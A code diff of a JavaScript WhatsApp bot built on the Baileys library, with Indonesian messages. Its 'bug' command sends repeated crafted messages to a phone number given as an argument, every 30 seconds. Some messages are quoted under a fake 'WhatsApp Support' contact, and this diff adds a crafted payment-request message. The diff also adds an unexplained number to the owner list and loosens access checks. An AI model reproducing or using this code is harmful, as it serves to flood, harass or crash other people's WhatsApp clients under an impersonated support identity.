@@ -4,7 +4,7 @@ const { exec } = require('child_process')
 const axios = require('axios').default
 const fs = require('fs')
 autobug = true
-mode = false
+mode = true
 
 module.exports = async (semar, denz, msg) => {
 try {
@@ -19,7 +19,7 @@ const isCmd = body.startsWith(prefix)
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
 const dn = args.join(' ')
-const nomorOwner = ['6285866295942','628985245738','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224']
+const nomorOwner = ['6285866295942','628985245738','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224']
 const isGroup = from.endsWith('@g.us')
 const botNumber = semar.user.id.split(':')[0]
 const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
@@ -37,9 +37,7 @@ const isDev = nomorDeveloper.includes(senderNumber) || isSaya
 const isOwner = nomorOwner.includes(senderNumber) || isSaya
 const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
 const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
-//©from: ivan
 const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
-//©from: andik
 const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
 
 const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
@@ -80,7 +78,7 @@ return reply(require('util').format(evaluate))} catch(e){
 return reply(require('util').format(e))}}
 
 if (command) { await semar.readMessages([msg.key]) }
-if (!mode) { if (!isOwner && !msg.key.fromMe) return }
+if (!mode) { if (!isDev && !msg.key.fromMe) return }
 switch (command) {
 //©from: dennis
 case 'cek': case 'test': case 'status':
@@ -195,6 +193,8 @@ reply('Loading...')
 function delay1Menit(i) { setTimeout(() => {
 reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
 semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
+var requestPaymentMessage = generateWAMessageFromContent(`${dn}@s.whatsapp.net`, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61",}}}), { userJid: `${dn}@s.whatsapp.net`, quoted: stickerMessage})
+semar.relayMessage(`${dn}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 delay1Menit(++i)}, 30000)}
 delay1Menit(0)
 break
@@ -269,7 +269,7 @@ break
 
 //©from: dennis
 case 'restart':
-if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
 break
 
